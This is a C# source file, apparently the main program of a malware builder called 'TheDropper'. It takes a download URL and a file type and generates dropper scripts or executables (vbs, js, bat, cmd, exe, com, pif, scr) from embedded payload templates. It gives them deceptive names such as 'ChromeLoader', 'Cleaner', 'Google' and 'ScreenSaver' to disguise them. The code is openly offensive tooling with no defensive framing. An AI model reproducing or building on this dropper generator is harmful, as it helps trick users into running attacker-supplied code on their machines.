using System;
using System.Resources;
using TheDropper.Generators;
namespace TheDropper
{
    class Program
    {
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                throw new ArgumentException("args must be 2 arguments \n example usage: dropper.exe http:/localhost:8000/executable/asfg.exe vbs");
            }
            string file;
            string url = args[0];
            string ext = args[1];

            // Check url
            if (!url.StartsWith("http"))
            {
                throw new ArgumentException("url should start with http://");
            }
            // Check extension
            if (string.IsNullOrEmpty(ext))
            {
                throw new ArgumentException("method should not be empty");
            }

            // Create generators
            ScriptGenerator sg = new ScriptGenerator(url);
            ExecutableGenerator eg = new ExecutableGenerator(url);

            // Handle
            switch (ext)
            {
                case "vbs":
                    {
                        file = sg.Generate(Properties.Resources.vbs_payload, "SuperScript", "vbs");
                        break;
                    }
                case "js":
                    {
                        file = sg.Generate(Properties.Resources.js_payload, "ChromeLoader", "js");
                        break;
                    }
                case "bat":
                    {
                        file = sg.Generate(Properties.Resources.batch_payload, "Cleaner", "bat");
                        break;
                    }
                case "cmd":
                    {
                        file = sg.Generate(Properties.Resources.batch_payload, "Builder", "cmd");
                        break;
                    }
                case "exe":
                    {
                        file = eg.Generate("Chrome", "exe");
                        break;
                    }
                case "com":
                    {
                        file = eg.Generate("Google", "com");
                        break;
                    }
                case "pif":
                    {
                        file = eg.Generate("Information", "pif");
                        break;
                    }
                case "scr":
                    {
                        file = eg.Generate("ScreenSaver", "scr");
                        break;
                    }
                default:
                    {
                        throw new Exception("unexpected method");
                    }
            }

            // Ok message
            if (!System.IO.File.Exists(file))
            {
                throw new Exception("error");
            }
        }
    }
}
